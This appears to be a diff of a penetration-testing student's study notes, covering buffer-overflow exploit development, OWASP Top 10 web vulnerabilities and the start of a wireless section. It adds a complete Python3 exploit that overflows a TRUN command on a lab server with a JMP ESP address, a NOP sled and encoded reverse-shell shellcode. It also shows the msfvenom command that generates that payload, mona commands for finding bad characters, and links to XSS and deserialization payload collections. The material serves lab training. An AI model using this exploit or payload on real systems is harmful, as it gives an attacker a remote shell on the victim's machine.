@@ -2190,11 +2190,14 @@ except:
 
 ### Generating Shellcode and Gaining Root
 
+> [!fail] 
+> In my environment Exploit didn't work ... 
+> Update: In next Video I found soulution, most likly because I try to run it with Python3...
+
 ``` 
 # -b is bad character(s)
 msfvenom -p windows/shell_reverse_tcp lhost=192.168.203.132 lport=4444  exitfunc=thread -f c -a x86 -b "\x00"
 ```
-
 
 ``` 
 #!/usr/bin/python
@@ -2247,6 +2250,86 @@ except:
 ```
 
 
+### Exploit Development Using Python3 and Mona
+
+> [!tip] 
+>In Immunity Debugger, the command "!mona bytearray -cpb "\x00"" is used to generate a sequence of bytes that can be used for testing buffer overflow vulnerabilities in a target application.
+> `!mona bytearray -cpb "\x00"` 
+
+![[Pasted image 20230408184704.png]]
+
+![[Pasted image 20230408184834.png]]
+
+> [!todo] 
+> Finding Bad characters:, use ESP you see in your Immunity Debugger
+> `!mona compare -f c:\mona\bytearray.bin -a 010AF9C8` 
+
+![[Pasted image 20230408185226.png]]
+
+![[Pasted image 20230408185527.png]]
+
+> [!todo] 
+> Use mona to find Jump Address:
+> `!mona jmp -r ESP -m "essfunc.dll"` 
+
+![[Pasted image 20230408185856.png]]
+
+![[Pasted image 20230408185924.png]]
+
+
+> [!success] 
+>  Final exploit which is working:
+
+``` 
+#!/usr/bin/python3
+
+import sys, socket
+from time import sleep
+
+overflow = (
+b"\xdd\xc7\xb8\x32\x64\x94\x70\xd9\x74\x24\xf4\x5b\x29\xc9"
+b"\xb1\x52\x31\x43\x17\x83\xeb\xfc\x03\x71\x77\x76\x85\x89"
+b"\x9f\xf4\x66\x71\x60\x99\xef\x94\x51\x99\x94\xdd\xc2\x29"
+b"\xde\xb3\xee\xc2\xb2\x27\x64\xa6\x1a\x48\xcd\x0d\x7d\x67"
+b"\xce\x3e\xbd\xe6\x4c\x3d\x92\xc8\x6d\x8e\xe7\x09\xa9\xf3"
+b"\x0a\x5b\x62\x7f\xb8\x4b\x07\x35\x01\xe0\x5b\xdb\x01\x15"
+b"\x2b\xda\x20\x88\x27\x85\xe2\x2b\xeb\xbd\xaa\x33\xe8\xf8"
+b"\x65\xc8\xda\x77\x74\x18\x13\x77\xdb\x65\x9b\x8a\x25\xa2"
+b"\x1c\x75\x50\xda\x5e\x08\x63\x19\x1c\xd6\xe6\xb9\x86\x9d"
+b"\x51\x65\x36\x71\x07\xee\x34\x3e\x43\xa8\x58\xc1\x80\xc3"
+b"\x65\x4a\x27\x03\xec\x08\x0c\x87\xb4\xcb\x2d\x9e\x10\xbd"
+b"\x52\xc0\xfa\x62\xf7\x8b\x17\x76\x8a\xd6\x7f\xbb\xa7\xe8"
+b"\x7f\xd3\xb0\x9b\x4d\x7c\x6b\x33\xfe\xf5\xb5\xc4\x01\x2c"
+b"\x01\x5a\xfc\xcf\x72\x73\x3b\x9b\x22\xeb\xea\xa4\xa8\xeb"
+b"\x13\x71\x7e\xbb\xbb\x2a\x3f\x6b\x7c\x9b\xd7\x61\x73\xc4"
+b"\xc8\x8a\x59\x6d\x62\x71\x0a\x52\xdb\xb2\x4d\x3a\x1e\x44"
+b"\x43\xe7\x97\xa2\x09\x07\xfe\x7d\xa6\xbe\x5b\xf5\x57\x3e"
+b"\x76\x70\x57\xb4\x75\x85\x16\x3d\xf3\x95\xcf\xcd\x4e\xc7"
+b"\x46\xd1\x64\x6f\x04\x40\xe3\x6f\x43\x79\xbc\x38\x04\x4f"
+b"\xb5\xac\xb8\xf6\x6f\xd2\x40\x6e\x57\x56\x9f\x53\x56\x57"
+b"\x52\xef\x7c\x47\xaa\xf0\x38\x33\x62\xa7\x96\xed\xc4\x11"
+b"\x59\x47\x9f\xce\x33\x0f\x66\x3d\x84\x49\x67\x68\x72\xb5"
+b"\xd6\xc5\xc3\xca\xd7\x81\xc3\xb3\x05\x32\x2b\x6e\x8e\x52"
+b"\xce\xba\xfb\xfa\x57\x2f\x46\x67\x68\x9a\x85\x9e\xeb\x2e"
+b"\x76\x65\xf3\x5b\x73\x21\xb3\xb0\x09\x3a\x56\xb6\xbe\x3b"
+b"\x73")
+
+shellcode = b"A" * 2003 + b"\xaf\x11\x50\x62" + b"\x90" * 16 + overflow
+
+try:
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	s.connect(('192.168.203.139',9999))
+
+	payload = b"TRUN /.:/" + shellcode
+
+	s.send((payload))
+	s.close()
+except:
+	print ("Error connecting to server")
+	sys.exit()
+```
+
+![[Pasted image 20230408184750.png]]
 
 
 ## Active Directory Overview
@@ -4221,4 +4304,55 @@ OWASP A6-Security Misconfigurations: https://www.owasp.org/index.php/Top_10-2017
 
 ![[Pasted image 20230407162303.png]]
 
+
+### Stored XSS Walkthrough
+
+> [!tip] 
+> You can find a lot of XSS Payloads on GitHub:
+> https://github.com/pgaijin66/XSS-Payloads/blob/master/payload/payload.txt
+> 
+
+
+### Preventing XSS
+
+![[Pasted image 20230408174310.png]]
+
+
+### Insecure Deserialization
+
+> [!note] 
+> Resources for this video:
+OWASP A8-Insecure Deserialization: https://www.owasp.org/index.php/Top_10-2017_A8-Insecure_Deserialization
+
+![[Pasted image 20230408175047.png]]
+
+> [!tip] 
+> A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization. 
+>  https://github.com/frohoff/ysoserial
+
+
+### Using Components with Known Vulnerabilities
+
+> [!note] 
+> Resources for this video:
+OWASP A9-Using Components with Known Vulnerabilities: https://www.owasp.org/index.php/Top_10-2017_A9-Using_Components_with_Known_Vulnerabilities
+
+> [!todo] 
+> - Scan Web-App with Nessus
+> - Scan Web-App with Burp Suite Pro and some additional plugins
+
+
+### Insufficient Logging and Monitoring
+
+> [!note] 
+> Resources for this video:
+OWASP A10-Insufficient Logging & Monitoring: https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A10-Insufficient_Logging%252526Monitoring.html
+
+![[Pasted image 20230408175956.png]]
+
+
+## Wireless Penetration Testing
+
+
+### 001 Wireless Penetration Testing Overview
 
